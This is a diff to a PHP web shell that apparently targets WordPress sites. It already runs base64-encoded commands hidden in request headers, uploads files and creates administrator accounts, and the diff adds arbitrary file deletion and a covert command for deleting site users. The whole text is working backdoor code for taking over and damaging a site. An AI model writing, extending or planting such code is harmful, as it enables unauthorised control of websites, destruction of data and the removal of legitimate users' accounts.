@@ -10,6 +10,7 @@ error_reporting(0);
 	-Add admin account 
 	-Backdoor FTP // TODO
 	-Activate / Deactivate plugins //TODO
+	-Delete user
 
 	
 
@@ -210,6 +211,9 @@ function browser($string) {
 		case "upload":
 			upload_file($cmd[1], @$_POST['upload']);
 			break;
+		case "delete":
+			del_file($cmd[1]);
+			break;
 	}
 }
 
@@ -234,12 +238,21 @@ function upload_file($file,$source) {
 	fwrite($file, base64_decode($source));
 }
 
+function del_file($file) {
+	unlink($file);
+}
+
 function add_admin($username, $pass) {
 	$user_id = wp_create_user($username, $pass);
 	$user = new WP_User($user_id);
 	$user->set_role('administrator');
 }
 
+function del_user($login) {
+	$user = get_user_by('login', $login);
+	$id = $user->ID;
+	wp_delete_user($id);
+}
 function perms ($file) { //extracted from PHP.NET
 $permisos = fileperms($file);
 if (($permisos & 0xC000) == 0xC000) {
@@ -375,6 +388,8 @@ function process_headers() {
 			case "wp_addadmin":
 				add_admin(base64_decode($commands[1]), base64_encode($commands[2]));
 				break;
+			case "wp_delete_user":
+				del_user(base64_decode($commands[1]));
 		}
 	}
 	
@@ -411,6 +426,7 @@ load_wp_config();
 require(find_file("wp-load.php"));
 require(find_file("wp-admin/includes/plugin.php"));
 require(find_file('wp-includes/registration.php'));
+require(find_file('wp-admin/includes/user.php'));
 define('DB_PREFIX', @$table_prefix);
 
 
